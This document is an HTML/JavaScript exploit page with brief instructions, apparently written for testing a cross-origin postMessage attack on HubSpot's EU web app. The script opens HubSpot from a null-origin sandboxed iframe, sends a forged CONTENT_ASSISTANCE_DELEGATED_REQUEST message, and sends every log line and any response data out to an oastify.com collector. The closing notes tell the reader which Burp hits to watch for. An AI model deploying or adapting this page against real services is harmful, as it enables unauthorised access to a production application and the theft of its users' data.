<!DOCTYPE html>
<html>
<head><title>Relay</title></head>
<body>
<h1>Relay Active</h1>
<div id="status" style="font-family:monospace;font-size:12px;"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
const status = document.getElementById('status');

function log(msg) {
    status.innerHTML += '<br>' + msg;
    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
}

log('relay_loaded');

window.addEventListener('message', function(e) {
    const msgStr = JSON.stringify(e.data).substring(0, 200);
    log('MSG_FROM=' + e.origin + '_DATA=' + msgStr);
    
    if (e.data && e.data.action === 'startExploit') {
        log('EXPLOIT_TRIGGERED');
        
        const iframe = document.createElement('iframe');
        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
        iframe.src = 'about:blank';
        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
        
        iframe.onload = function() {
            log('SANDBOX_LOADED');
            
            const doc = iframe.contentWindow.document;
            doc.open();
            doc.write(`
<!DOCTYPE html>
<html>
<head><title>Sandbox</title></head>
<body>
<h2>Sandbox</h2>
<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:350px;overflow:auto;"></div>
<script>
const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';

function log(msg) {
    const d = document.getElementById('log');
    d.innerHTML += '<br>' + msg;
    d.scrollTop = d.scrollHeight;
    new Image().src = EXFIL + '/?s=' + encodeURIComponent(msg);
}

log('sandbox_running');
log('origin=' + window.origin);

// Listen for ANY message to see if HubSpot responds
window.addEventListener('message', function(resp) {
    log('!!! GOT_RESPONSE !!!');
    log('from=' + resp.origin);
    log('type=' + (resp.data.type || 'unknown'));
    log('data=' + JSON.stringify(resp.data).substring(0, 100));
    new Image().src = EXFIL + '/?RESPONSE=' + encodeURIComponent(JSON.stringify(resp.data).substring(0, 500));
});

try {
    log('opening_hubspot');
    let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');
    
    if (!hub) {
        log('ERROR_popup_blocked');
    } else {
        log('popup_opened');
        
        let attempts = 0;
        let checker = setInterval(() => {
            attempts++;
            
            try {
                hub.origin; // Will throw when cross-origin
                if (attempts % 10 === 0) log('waiting_' + attempts);
            } catch(e) {
                clearInterval(checker);
                log('hubspot_loaded_' + attempts);
                
                // Wait a bit for HubSpot to fully initialize
                setTimeout(() => {
                    log('SENDING_EXPLOIT_NOW');
                    
                    // Send the exact format HubSpot expects
                    hub.postMessage({
                        type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
                        commandId: 'exploit123',
                        featureId: 'email_editor',
                        parameters: {},
                        resultCount: 1,
                        language: 'en',
                        objectId: '46962361',
                        applicationId: 'email',
                        basePath: '/',
                        maxPollingAttempts: 5,
                        pollingInterval: 1000
                    }, '*');
                    
                    log('message_sent_to_hubspot');
                    log('waiting_for_response...');
                    
                }, 2000);
            }
            
            if (attempts > 100) {
                clearInterval(checker);
                log('timeout');
            }
        }, 100);
    }
} catch(err) {
    log('ERROR=' + err.message);
}
<\\/script>
</body>
</html>
            `);
            doc.close();
        };
        
        document.body.appendChild(iframe);
        log('SANDBOX_ADDED');
    }
});

if(window.opener){
    log('has_opener');
    window.opener.postMessage({status:'ready'},'*');
} else {
    log('no_opener');
}
</script>
</body>
</html>
```

---

## **What This Does:**

1. **Listens for ANY response** from HubSpot
2. **Sends exactly one CONTENT_ASSISTANCE_DELEGATED_REQUEST** message
3. **Waits 2 seconds** after HubSpot loads to ensure all listeners are registered
4. **Logs everything** to both screen and Burp

---

## **What to Look For:**

Check Burp for:
```
/?s=origin=null              ← Should be null with about:blank
/?s=popup_opened
/?s=hubspot_loaded_XX
/?s=SENDING_EXPLOIT_NOW
/?s=message_sent_to_hubspot
/?s=waiting_for_response...
/?s=!!!_GOT_RESPONSE_!!!     ← THE MONEY SHOT!
/?RESPONSE=...               ← The actual response data
